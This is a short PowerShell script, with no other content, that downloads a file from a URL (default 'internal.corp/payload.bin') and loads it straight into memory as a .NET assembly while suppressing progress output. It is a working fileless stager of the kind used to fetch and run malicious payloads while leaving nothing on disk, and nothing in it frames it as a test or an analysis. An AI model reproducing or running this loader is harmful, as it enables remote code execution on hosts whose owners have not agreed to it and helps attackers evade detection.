
[CmdletBinding()]
param(
    [string]$DownloadUrl = 'https://internal.corp/payload.bin'
)
$StageBytes = (New-Object System.Net.WebClient).DownloadData($DownloadUrl)
[Reflection.Assembly]::Load($StageBytes)
$ProgressPreference = "SilentlyContinue"
